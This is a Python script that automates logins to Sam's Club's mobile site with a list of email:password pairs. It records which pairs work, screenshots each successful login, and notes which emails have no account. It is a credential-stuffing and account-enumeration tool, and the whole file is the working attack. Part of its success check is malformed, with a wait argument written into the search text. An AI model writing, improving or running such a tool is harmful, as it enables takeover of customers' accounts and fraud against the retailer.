# import splinter
from splinter import Browser
import time
# import sys
# import os


def windmill():
    bigdrain = open('user_list.txt', 'r')
    text = bigdrain.readlines()
    # visit the url in one browser session
    browser = Browser('firefox')
    browser.visit('https://m.samsclub.com/account/login?xid=hpg_login')
    bad_password_list = []
    bad_username_list = []
    working_username_pswds = []

    for line in text:
        li = line.strip()
        if not li.startswith("/"):
            email,password = line.split(":")
            username1 = email
            password1 = password
            # browser = Browser(user_agent="Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP)")
            time.sleep(1)
            browser.find_by_css('.sc-text-field-input').fill("")
            browser.find_by_css('.sc-text-field-input').type(username1)
            browser.find_by_id('password').first.find_by_tag('input').type(password1)
            browser.find_by_css('.sc-primary-button').last.click()
            time.sleep(5)

            if browser.is_text_present('Offers available, wait-time=18') is True:
                browser.driver.save_screenshot(email + '-' + password + '.png')
                print email + ":" + password + "matched successfully!"
                working_username_pswds.append(username1 + ":" + password1)
            elif browser.is_text_present('Your password is incorrect', wait_time=1) is True:
                print ('{} password is not correct'.format(username1))
                bad_password_list.append(username1 + ":" + password1)
            # elif browser.find_by_css('sc-error-message-list') == 'We cannot find an account with that email address':
            elif browser.is_text_present('We cannot find an account with that email address', wait_time=1) is True:
                print ('{} does not exist'.format(username1))
                bad_username_list.append(username1 + ":" + password1)

        else:
            print('ignoring line: {}'.format(str(line)))

    bigdrain.close()
    browser.quit()
    print ('list of working users {}'.format(working_username_pswds))


if __name__ == '__main__':
    windmill()
